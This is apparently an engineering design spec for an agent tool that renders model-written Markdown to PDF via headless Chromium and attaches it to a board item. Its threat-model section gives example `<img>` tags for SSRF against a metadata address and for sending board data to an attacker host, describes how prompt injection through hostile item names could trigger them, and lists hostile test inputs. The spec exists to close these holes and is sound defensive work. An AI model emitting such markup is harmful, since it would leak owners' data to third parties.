# Agent PDF Output — Design

**Status:** spec written, awaiting review
**Slice:** an agent renders a report to PDF and attaches it to an item
**Branch:** `task/agent-pdf-output`

---

## 1. Problem

A personal agent can already author a document and attach it to an item
(`create_file`, `src/lib/agents/create-file.ts`), but only as **text** — md, txt,
csv, html, json. The thing an owner actually wants at 07:00 is a **PDF** they can
forward: a rendered document with type hierarchy, not a markdown blob whose
formatting survives only in an editor.

The app already renders PDFs. `renderHtmlToPdf` (`src/lib/reports/pdf.ts:14`) is
`server-only`, launches headless Chromium per call (`@sparticuz/chromium` on
Vercel, local Chrome otherwise) and uses `page.setContent` — no navigation, no
cookies, no auth reaching the browser. Its only production caller today is
`exportReportPdf` (`src/lib/reports/actions.ts:346-395`), reached from
`ReportBuilder.tsx`.

This slice gives the agent a second entry point into that renderer: one new
agent-only tool verb, `create_pdf`.

---

## 2. Ground truth (verified in this worktree, not assumed)

| Claim                                                                                                     | Evidence                                                                                                                                                                                   |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `renderHtmlToPdf(html, { landscape })` returns `Buffer`, hardcodes A4 + fixed margins + `printBackground` | `src/lib/reports/pdf.ts:14-41`                                                                                                                                                             |
| Wiring an agent-only verb is one array entry                                                              | `src/lib/agents/agent-only-tools.ts:20-23`; consumed by `route.ts` (`buildAgentRuntime`), `proposal-actions.ts:125`, `proposal-targets.ts:68`                                              |
| `create-file.ts` is the shape to copy: factory-with-injected-deps, `invoke(ctx, raw)` the only entry      | `src/lib/agents/create-file.ts:72-146`                                                                                                                                                     |
| `MAX_INLINE_BYTES = 131_072` exists twice, deliberately                                                   | `create-file.ts:22-25`, `attach-file.ts:14-17,86-90`                                                                                                                                       |
| `create_attachment_upload` is structurally closed to agents                                               | `create-attachment-upload.ts:101` (`agentExcluded: true`) → dropped by `descriptorsFor` (`tool-descriptors.ts:62`) → `makeGrantGate` fails closed on unknown names (`grant-gate.ts:69-73`) |
| A tool that throws degrades the step, not the run                                                         | `tools.ts:99-105` turns a throw into `{ error }`; `run-loop.ts` continues                                                                                                                  |
| Only `api/mcp/route.ts:11` declares `maxDuration` (60). The agent run route declares none                 | `grep -rn maxDuration src/` → one hit                                                                                                                                                      |
| `@sparticuz/chromium` + `playwright-core` are already external to the bundler                             | `next.config.ts:24` `serverExternalPackages`                                                                                                                                               |
| A pure, dependency-free Markdown AST parser already exists and invites reuse                              | `src/lib/boards/markdown.ts:1-20` ("reused by any renderer, present or future"), `parseMarkdown` at :573                                                                                   |
| That parser already gates link hrefs through `isHttpUrl` and degrades unsafe schemes to text              | `markdown.ts:447-480`, `validations/boards.ts:197-203`                                                                                                                                     |
| No markdown or sanitizer library is installed                                                             | `package.json` — no `marked`/`markdown-it`/`remark`/`dompurify`/`sanitize-html`                                                                                                            |
| `escapeHtml` exists twice as a private local helper; that is the codebase's pattern                       | `digest/render.ts:16`, `agents/briefing-render.ts:41`                                                                                                                                      |
| The agent's system prompt names no tools, so no prompt edit is needed                                     | `run-loop.ts:68-83` (`PREAMBLE`)                                                                                                                                                           |
| Mocking `@/lib/reports/pdf` in a unit test is established practice                                        | `reports/actions.test.ts:135`                                                                                                                                                              |

---

## 3. THE CENTRAL PROBLEM: 128 KB

### 3.1 What the ceiling actually bounds

`MAX_INLINE_BYTES = 131_072` is duplicated on purpose — `create-file.ts:22-24`
says so outright: the pre-check exists so the model gets an actionable message,
and `attach-file.ts:86` keeps its own check as the real boundary, post-decode.

Read both comments closely and the ceiling turns out **not** to be a limit on
what a file may weigh. `attach-file.ts:14-16` gives the reason in its own words:
"Base64 costs ~1.37 tokens/byte, so 128 KB is ~44k tokens in one tool call". It
is a bound on **the payload a caller hands across a tool boundary** — the thing
that costs context, that a model emits token by token, and that lands verbatim
in `user_agent_proposals.input` for up to seven days.

A charted, paginated PDF routinely exceeds 128 KB. But those bytes are **never
emitted by a model and never traverse a tool call**: Chromium produces them
server-side, inside one invocation, and they go straight to Storage. They cost
zero context. Applying a context-budget ceiling to them would be applying the
right number to the wrong quantity.

### 3.2 Resolution: two ceilings, two rationales

| Quantity                                   | Ceiling                                         | Where enforced                                             | Why that number                                                                                                                                                                                                              |
| ------------------------------------------ | ----------------------------------------------- | ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Markdown source** the model emits        | `131_072` (`MAX_SOURCE_BYTES`, `create-pdf.ts`) | Pre-check in `create_pdf.invoke`, before rendering         | Identical rationale to `create-file.ts:22-25` — bounds one tool call's payload and the stored proposal blob. The literal is duplicated a third time, deliberately, for the reason already written at `create-file.ts:22-24`. |
| **Rendered PDF** bytes the server produces | `52_428_800` (`MAX_ATTACHMENT_BYTES`)           | `uploadAndRegisterAttachment`, before the Storage `upload` | The `attachments` bucket ceiling, already mirrored at `create-attachment-upload.ts:11`. An oversize render must fail with an actionable sentence, not an opaque Storage error.                                               |

The PDF therefore bypasses base64 entirely: **render → `supabase.storage.upload`
→ `createAttachmentCore`**, all on the agent-owner's RLS-scoped client, inside
one tool invocation.

### 3.3 Alternatives considered and rejected

**(a) Raise `MAX_INLINE_BYTES` / route PDF bytes through `attachFileHandler`.**
Rejected. `attach_file` is part of the MCP catalog — a contract with third-party
clients — and its ceiling exists to stop _a caller_ shipping a 44k-token payload.
Raising it to fit our server-produced bytes would relax a limit for every remote
caller in order to serve one local one. Routing through it unchanged is
impossible: the bytes would fail the same check.

**(b) Re-open `create_attachment_upload` to agents (drop `agentExcluded`).**
Rejected, twice over. First, it does not work: `tools.ts` gives the model no way
to PUT bytes to a signed URL — there is no fetch verb in the tool set, which is
exactly why `create-attachment-upload.ts:101` and `tools.ts:46-50` exclude it.
Second, it would widen the fail-closed surface pinned by `grant-gate.test.ts:215-222`
and `proposal-actions.ts:113-120` (a row naming an `agentExcluded` tool is
correctly un-approvable). The escape hatch stays closed.

**(c) Have the agent write HTML with `create_file`, then a second tool converts
the stored attachment to PDF.** Rejected on YAGNI and on the injection surface
(§5): two round trips, two attachments, and the intermediate HTML is a
model-authored document we would then have to trust.

**(d) Render an existing saved report by `reportId`.** Rejected for this slice.
It is a genuinely different feature (report access resolution, scope context,
`deriveRenderData`) and it is not "an agent **writes** a report" — it is "an
agent exports someone else's". Noted as a future sibling verb in §12.

### 3.4 Size and MIME still never come from the caller

`attach_file`'s stated invariant is that size and type are read from Storage,
not from the caller (`attach-file.ts:178-180`). The inline branch already
satisfies that invariant a different way — it reports `bytes.byteLength`, the
server's own count of the bytes it just wrote (`attach-file.ts:107`), and
`createAttachmentCore` is handed that number, not a claim.

`create_pdf` is in the same position, more strongly: the `mimeType` is the fixed
constant `application/pdf` (the model cannot influence it, exactly as
`FILE_FORMATS` fixes it for `create_file`), and `sizeBytes` is the
`byteLength` of the Buffer Chromium returned. **No field of the attachment row
is caller-supplied except the file name**, which is sanitised by
`sanitizeFileName` before it reaches an object key
(`attachments-path.ts:14-30`). A post-upload `storage.info()` round trip would
add a network call to re-learn a number we produced ourselves; it is not
included.

---

## 4. The tool

### 4.1 Descriptor

```
name:        create_pdf
title:       Create PDF
capability:  files.write        ← REUSED. No new capability is minted (§7).
scope:       itemId
```

Agent-only: appended to `AGENT_ONLY_DESCRIPTORS`, never registered on the MCP
server. The reasoning at `agent-only-tools.ts:5-19` transfers verbatim — the
verb only makes sense for a caller that authors a document as text in the same
turn.

### 4.2 Input

| Field      | Type           | Notes                                                                                                       |
| ---------- | -------------- | ----------------------------------------------------------------------------------------------------------- |
| `itemId`   | uuid           | The attachment target. Drives `scope: "itemId"` for board-scope enforcement and proposal target resolution. |
| `columnId` | uuid, optional | A Files column, for a cell-level attachment. Same semantics as `create_file`.                               |
| `fileName` | string, 1..200 | `.pdf` appended unless already present (case-insensitive), mirroring `create-file.ts:96-99`.                |
| `content`  | string, min 1  | **Markdown source.** ≤ 128 KB of UTF-8.                                                                     |

No `format` (there is one), no `orientation` (§6.2), no `title` (the document's
own `# Heading` is the title). Deliberately the smallest input that differs from
`create_file` by exactly one thing: what the server does with `content`.

### 4.3 Output

Success — one JSON text block:

```json
{
  "ok": true,
  "attachmentId": "…",
  "fileName": "q3-review.pdf",
  "bytes": 148213
}
```

`bytes` is the **rendered PDF's** size, so the model can report a real number
instead of guessing. `attachmentId` is read directly off the helper's typed
`ActionResult` — unlike `create_file`, which must scrape it out of a JSON text
block (`create-file.ts:55-63`), this path never stringifies it in the first
place, so no defensive `readAttachmentId` equivalent is needed.

Failures are ordinary `isError: true` results; `tools.ts:98` converts each into
the one failure shape `{ error }`. Every message names the limit or the cause so
the model can act:

| Condition                 | Message                                                                                                                                     |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| source > 128 KB           | `That document is N bytes; create_pdf accepts up to 128 KB of Markdown source. Write a shorter document, or split it across several files.` |
| item not visible          | `Item not found.`                                                                                                                           |
| render exceeded the bound | `Rendering that document took longer than 45 seconds. Try a shorter document.`                                                              |
| render threw              | the underlying message, verbatim                                                                                                            |
| PDF > 50 MB               | `That PDF is N bytes; the attachments bucket accepts up to 50 MB.`                                                                          |
| upload / register failed  | the underlying message, verbatim                                                                                                            |

---

## 5. Rendering pipeline — and the property that makes it safe

```
content (Markdown, model-authored, UNTRUSTED)
  → parseMarkdown()            src/lib/boards/markdown.ts   [reused, unchanged]
  → Block[] / Inline[]         a CLOSED, typed AST
  → renderBlocksToHtml()       src/lib/boards/markdown-html.ts   [new, pure]
  → buildAgentPdfHtml()        src/lib/agents/pdf-document.ts    [new, pure]
  → renderHtmlToPdf(html, { landscape: false })   [reused, UNCHANGED]
  → Buffer
```

### 5.1 Why the model may not hand us HTML

`renderHtmlToPdf` calls `page.setContent(html, { waitUntil: "networkidle" })`.
Chromium **will** fetch what that document references. Today every caller is
`buildReportHtml`, whose markup is server-generated from a report config, so the
question never arose. Model-authored HTML changes that completely: an
`<img src="http://169.254.169.254/…">` is an SSRF from inside our function, and
an `<img src="https://attacker/?d=…">` is an exfiltration channel for anything
the model read out of the owner's boards during the run. Prompt injection makes
this reachable by a third party — a hostile item name is untrusted content the
model is explicitly told to treat as data (`run-loop.ts:71-72`), but "told" is
not "prevented".

So the tool accepts **Markdown, not HTML**, and the AST is the boundary:

- `parseMarkdown` emits exactly six block kinds and six inline kinds. There is
  no image node, no raw-HTML node, no script node, and **no way to express one**.
  Anything else in the source becomes a text node.
- `renderBlocksToHtml` escapes every `text` value, every `code` value and every
  `href` attribute. `<script>` in the source arrives in the PDF as the visible
  characters `<script>`.
- Link hrefs are already gated by `isHttpUrl` upstream (`markdown.ts:470-480`) —
  a `javascript:` or `data:` link is downgraded to literal text before it ever
  reaches the renderer. We escape the href anyway, as the second layer.
- The page's CSS is a server-owned constant with no `url(`, no `@import` and no
  `@font-face`. Pinned by a test.

Net: the rendered document references **zero external resources**, so
`networkidle` resolves on the first tick and there is nothing for Chromium to
fetch. `src/lib/reports/pdf.ts` is not modified — no request interception, no
new option, no risk to the report-export path.

This is the load-bearing trade: **we buy a closed injection surface by giving up
raw HTML**, and with it (today) tables and images. §12 records that.

### 5.2 Why reuse `parseMarkdown` rather than add a dependency

AGENTS.md: grep before writing a helper. `src/lib/boards/markdown.ts` is pure,
DOM-free, already unit-tested (`markdown.test.ts`), already handles the
emphasis/link edge cases a from-scratch parser gets wrong, and its own header
comment states it exists to be "reused by any renderer, present or future".
Adding `markdown-it`/`marked` would mean a new dependency whose default output
_includes raw HTML pass-through_ — i.e. buying back the exact surface §5.1
closes, then configuring it away.

`renderBlocksToHtml` lives at `src/lib/boards/markdown-html.ts`, beside the
module that owns the AST, so that widening `Block`/`Inline` fails to typecheck
in the sibling file rather than silently dropping a node kind from the PDF.
`MarkdownPreview.tsx` is its React counterpart; the two render the same AST for
different targets and neither is derivable from the other (JSX vs. a string for
`setContent`).

`escapeHtml` is a private local function, matching the two existing precedents
(`digest/render.ts:16`, `briefing-render.ts:41`). Extracting a shared one would
edit two email renderers outside this slice; noted in §12.

---

## 6. Runtime, timeouts, cost

### 6.1 The timeout question, answered explicitly

Facts: the agent run route (`src/app/api/ai/personal-agent/route.ts`) declares
no `maxDuration`, so it inherits the platform default; only
`api/mcp/route.ts:11` sets one. A Chromium cold start on Vercel plus a
`setContent` render is seconds, not milliseconds, and it is the single slowest
thing an agent step can do.

Two independent measures, because they fail differently:

1. **In-tool bound (mandatory).** `create_pdf` races the render against
   `RENDER_TIMEOUT_MS = 45_000`. On timeout it returns an `isError` result, which
   `tools.ts:98` turns into `{ error }` — **the step degrades, the run
   continues**, and the 07:00 briefing still gets written and emailed. Without
   this, one pathological document is the difference between "the agent couldn't
   make the PDF" and "the agent produced nothing at all". The losing render
   promise gets a `.catch` attached so a late rejection cannot become an
   unhandled rejection, and the timer is `unref`'d so it cannot hold the
   function open.
2. **Route headroom (recommended, one line).** `export const maxDuration = 300;`
   on the agent run route. The in-tool bound protects the run only if the
   platform gives the function room to reach it; if the platform kills the
   function first, the whole run dies and the audit row reads
   `CLAIM_PLACEHOLDER`. This is an addition at the top of a file the concurrent
   2c slice also touches — textually low-risk, but it is the one change in this
   slice that affects **every** agent run, PDF or not. Flagged in §13 as an
   owner decision.

### 6.2 Fixed A4 portrait

`PdfOptions` is `{ landscape: boolean }` and everything else in
`renderHtmlToPdf` is hardcoded. `create_pdf` passes `landscape: false`. Prose
documents are portrait; there are no tables in the supported AST, which is the
only thing that wants landscape. **`src/lib/reports/pdf.ts` is not modified by
this slice** — that is a deliberate goal, because it is shared with report
export and every option added there is a shared-surface change.

### 6.3 Cost per call

One Chromium launch, one `setContent`, one `page.pdf`, one browser close (the
existing `finally` in `pdf.ts:39-41`). Three indexed PK reads on `items` (§9),
one Storage `PUT`, one `attachments` insert. No AI tokens beyond the markdown
the model was going to write anyway.

---

## 7. Capability, grants and the approval card

### 7.1 `files.write` is reused — no new capability

The tool writes an attachment to an item. That is precisely what `files.write`
already means (`attach_file`, `create_file`, `create_attachment_upload` all
declare it). A hypothetical `files.render` would buy nothing an owner could act
on differently — an owner who has granted "write files" has already accepted
"this agent may put documents on my items" — and it would pull in
`capabilities.ts:7-12`, `capability-copy.ts`, `CapabilityToggles.tsx` and
`AgentEditor.tsx`, the last of which is owned by the concurrently-scoped 2c
agent-memory slice. Reuse keeps this slice **disjoint**: it touches no file 2c
touches.

Consequence, stated plainly: an agent already granted `files.write` can render
PDFs from day one without the owner re-approving anything. That is the intended
reading of the existing grant.

### 7.2 The proposal path is mandatory, not optional

`files.write` is proposal-gated for an ungranted agent, so a `create_pdf` call
from such an agent is denied, recorded, and later executed **by the owner, from
their browser, with their privileges** (`proposal-actions.ts:33-95`). Two
consequences shape the design:

- **`sentenceFor` must gain a `create_pdf` case** (`proposal-summary.ts:260`).
  Without it, `summariseProposal` falls through to `Run create_pdf.` — a card
  that tells the owner nothing about what they are signing off, which
  `proposal-summary.ts:1-27` says is the entire job of that module.

  The sentence:

  > `Render "q3-review.pdf" from 4.2 KB of Markdown and attach it to an item.`

  It states the **source** size, which is a fact present in the stored input,
  and never an output size, which does not exist until approval renders it —
  the same reasoning `attach_file`'s `storagePath` branch already applies
  (`proposal-summary.ts:288-291`: "stating one here would be a guess presented
  as a fact"). It mirrors the tool's own `.pdf`-appending so the card names the
  file that will exist. `proposal-targets.ts` needs no change: `scope: "itemId"`
  means the item's name is resolved and rendered by the existing machinery.

- **The render happens at approval time, days later.** The stored input is
  markdown source, which re-validates cleanly against the schema
  (`proposal-actions.ts:221`) and re-renders deterministically. Nothing about
  the call depends on run-time state that could have gone stale — which is
  exactly why the design stores source rather than, say, a signed upload ticket
  (2-hour TTL, would be dead on arrival for a 7-day proposal window).

---

## 8. The attachment write path

New exported function in `src/lib/collaboration/attachment-core.ts` — the module
whose docstring already declares itself "the single implementation of 'register
an attachment row' for the whole app" (`attachment-core.ts:45-66`):

```ts
export const MAX_ATTACHMENT_BYTES = 52_428_800;

export async function uploadAndRegisterAttachment(
  supabase: SupabaseClient<Database>,
  input: { itemId; columnId?; fileName; mimeType; bytes: Uint8Array },
  actorId: string,
): Promise<
  ActionResult<{ attachmentId: string; storagePath: string; sizeBytes: number }>
>;
```

It owns the sequence that `attach-file.ts:82-153`'s inline branch performs today:
size guards → `resolveItemScope` → build the object key (column-scoped or
item-scoped) → `storage.upload` with a **server-chosen** content type →
`createAttachmentCore` → **remove the object if registering fails**. That last
step is the one a second copy would most plausibly forget, which is the argument
for one implementation rather than two.

`attachFileHandler`'s inline branch is refactored onto it (Task 2). This is a
mechanical extraction with an explicit gate: **`attach-file.test.ts` must pass
unmodified.** Its existing cases already pin the behaviour that matters — decoded
size reported, mime defaulting, the 128 KB refusal before any Storage call, and
`["upload", "remove"]` on a failed register. The `storagePath` branch is
untouched (it has the opposite cleanup rule — `attach-file.test.ts:159-171` —
and deliberately keeps its own path).

`create-attachment-upload.ts:11`'s private `MAX_BYTES` becomes an import of
`MAX_ATTACHMENT_BYTES`, so the bucket ceiling has one home. Its existing test
pins the value in the JSON response, so the swap is guarded.

---

## 9. Performance & data-fetching budget (working agreement #5)

**(a) First paint vs. interaction.** No UI is added or changed. First paint is
unaffected — with one hard requirement: `create-pdf.ts` must resolve
`@/lib/reports/pdf` through a **lazy `await import(...)`**, never a static one.
`AGENT_ONLY_DESCRIPTORS` is imported by `proposal-actions.ts` and
`proposal-targets.ts`, which the `/settings/agents` page renders; a static import
would drag `playwright-core` + `@sparticuz/chromium` into that route's module
graph and make an unrelated page pay Chromium's eval cost on every cold start.
The precedent is `export-html.tsx:14-18`, which defers `react-dom/server` for the
analogous reason. `import type { PdfOptions }` is fine — type imports are erased.

**(b) Does the interaction change server data?** Yes — it writes an object and
an `attachments` row. It is a tool invocation inside a Server Action / route
handler, never a client fetch. The one UI surface that observes a `create_pdf`
proposal is the existing approval card, which already revalidates
`/settings/agents` (`proposal-actions.ts:328,369`). No new revalidation, no new
client state, no History API involvement.

**(c) Is the hot-path read bounded and indexed?** Per call:

| Read                                                              | Bound                    |
| ----------------------------------------------------------------- | ------------------------ |
| `resolveItemScope` fail-fast pre-check (before spending Chromium) | `items` by PK, one row   |
| `resolveItemScope` inside `uploadAndRegisterAttachment`           | `items` by PK, one row   |
| `resolveItemScope` inside `createAttachmentCore`                  | `items` by PK, one row   |
| Files-column validation (only when `columnId` is present)         | `columns` by PK, one row |

Three PK reads instead of two is the price of failing fast on a hallucinated
`itemId` before a 5–45 s Chromium launch, and is called out here rather than
buried. `createAttachmentCore`'s own re-read is **not** skippable —
`attachment-core.ts:59-62` states that re-deriving tenancy from the item _is_
the path-spoof guard. No `select *`, no unbounded list, no growing table
scanned. The proposal-card read path is unchanged: still ≤3 bounded reads for a
whole page (`proposal-targets.ts:115-127`).

---

## 10. Units and interfaces

| Unit | File                                                  | Purity                 | Responsibility                                                  |
| ---- | ----------------------------------------------------- | ---------------------- | --------------------------------------------------------------- |
| U1   | `src/lib/boards/markdown-html.ts`                     | pure, no `server-only` | `renderBlocksToHtml(Block[]) → string`. Escapes everything.     |
| U2   | `src/lib/agents/pdf-document.ts`                      | pure, no `server-only` | `buildAgentPdfHtml(markdown) → string`; owns `AGENT_PDF_CSS`.   |
| U3   | `src/lib/collaboration/attachment-core.ts` (extended) | `server-only`          | `uploadAndRegisterAttachment`, `MAX_ATTACHMENT_BYTES`.          |
| U4   | `src/lib/agents/create-pdf.ts`                        | server (lazy Chromium) | The descriptor + `makeCreatePdfDescriptor({ render, attach })`. |
| U5   | `src/lib/agents/proposal-summary.ts` (extended)       | pure                   | The `create_pdf` approval sentence.                             |
| U6   | `agent-only-tools.ts` + route `maxDuration`           | —                      | Wiring.                                                         |

**The test seam is the factory**, exactly as in `create-file.ts:65-74`:
`ToolDescriptor.invoke` takes `(ctx, input)` and nothing else, so a test cannot
inject a third argument — it builds its own descriptor with fake `render` and
`attach`. No Chromium runs in the unit suite.

---

## 11. Testing strategy

Every task is TDD; the plan spells out the failing test first. Coverage that
must exist:

- **U1** — each block and inline kind renders; `<script>`, `<img onerror=…>`,
  `"` and `&` in text/code/href are escaped; a `javascript:` link arrives as
  literal text (via the real `parseMarkdown`); nesting recurses.
- **U2** — the document is a complete `<!doctype html>`; the CSS contains no
  `url(`, `@import` or `@font-face`; the built HTML matches
  `/<img|<script|<iframe|url\(/i` **never**; empty markdown still yields a valid
  document.
- **U3** — happy path uploads then inserts; a failed insert issues
  `["upload", "remove"]`; zero bytes and > 50 MB refuse **before** any Storage
  call; `sizeBytes` comes from the buffer, `mimeType` from the argument, never
  from a caller claim; column-scoped path nests the column id. Driven by the
  existing `makeFakeClient` (`src/test/mcp-fake-client.ts`), which already
  records `storage` ops and `attachments` inserts.
- **U3 regression** — `attach-file.test.ts` passes **unmodified**.
- **U4** — `.pdf` appended once, case-insensitively; 128 KB refusal happens
  before `render` is called; a render that exceeds the bound returns an
  actionable error and a late rejection does not throw; `landscape: false` is
  what reaches `render`; `mimeType` is always `application/pdf`; the attach
  helper's failure is surfaced verbatim; the success JSON carries the real PDF
  byte count and the attachment id.
- **U5** — the sentence names the file with `.pdf`, states the source size,
  states no output size, and falls back to `undefined` (→ `Run create_pdf.`)
  when `fileName` or `content` is missing.
- **U6** — `agent-only-tools.test.ts`'s `NAMES` gains `create_pdf`, which drives
  its three existing assertions (offered to the model, absent from the MCP
  catalog, classified by the grant gate); plus an explicit
  `{ capability: "files.write", scope: "itemId" }` assertion.
  `proposal-actions.real-descriptor.test.ts` gains an approve-path case that
  drives the **real** `createPdfDescriptor` with `@/lib/reports/pdf` mocked, so
  the decide path → descriptor seam is joined for this tool too.

Gates: `pnpm typecheck && pnpm lint && pnpm test && pnpm build`.
`pdf.test.ts` stays opt-in behind `PULSE_PDF_TEST=1`; a real end-to-end render is
verified manually (§14).

---

## 12. Out of scope

- **Tables, images, code blocks.** `parseMarkdown` has no node for them, so the
  PDF cannot contain them. For a "report" this is the most likely gap — see §13.
- **Landscape, page size, headers/footers, cover pages.** Fixed A4 portrait.
- **Rendering an existing saved report** (`reportId` → PDF). A separate verb
  with a separate access story; §3.3(d).
- **A shared `escapeHtml`.** Three private copies now; extraction would touch
  two email renderers outside this slice.
- **Extracting design tokens shared with `REPORT_CSS`.** `AGENT_PDF_CSS` matches
  its typographic register by hand.
- **Any change to** `run-loop.ts`, `document-inject.ts`, `AgentEditor.tsx`,
  `capabilities.ts`, `capability-copy.ts`, `CapabilityToggles.tsx` — owned by the
  concurrent 2c slice — **or to `src/lib/reports/pdf.ts`**, shared with report
  export.

---

## 13. Open questions for the owner

1. **Tables.** A report without tables may be the wrong shape for the job. Adding
   a `table` block to `src/lib/boards/markdown.ts` would serve this slice _and_
   the board text-cell editor — but it edits a module the cell editor renders on
   every board paint, which is a much wider blast radius than this slice. Ship
   prose-only v1, or widen the AST?
2. **`maxDuration = 300` on the agent run route.** In-tool the render is bounded
   at 45 s regardless. Setting the route value gives that bound room to work but
   changes a file for _every_ agent run and touches a file the 2c slice may also
   edit. Set it now, or ship the in-tool bound alone and set it when a real
   timeout is observed?
3. **Refactoring `attachFileHandler`'s inline branch onto the new helper.** It
   is the DRY answer and the cleanup-on-failure argument is real, but it edits
   the MCP contract path for a slice that does not otherwise need to. Do it (the
   plan's Task 2, gated on `attach-file.test.ts` passing unmodified), or leave
   `attach_file` alone and accept two copies of upload-then-register?

---

## 14. Manual acceptance (post-merge)

Not user-observable through any UI control — there is no button for this. The
acceptance path is an agent run:

1. Pull `develop`; the app runs against the DEV Supabase project (which holds
   real user data — AGENTS.md).
2. Settings → Agents → an agent with **Write files** granted.
3. Give it an instruction like: _"Write a one-page status report on the items
   assigned to me as a PDF and attach it to item &lt;id&gt;."_
4. Run it. Expect: the run completes, `tools_used` includes `create_pdf`.
5. Open the item → Attachments. Expect a `.pdf` with a non-trivial byte count
   that opens with headings, lists and emphasis rendered.
6. Repeat with an agent **without** `files.write`: expect the run to complete,
   an approval card in Settings → Agents reading
   _Render "…​.pdf" from N KB of Markdown and attach it to "&lt;item name&gt;"._,
   and the PDF to appear on the item only after Approve.
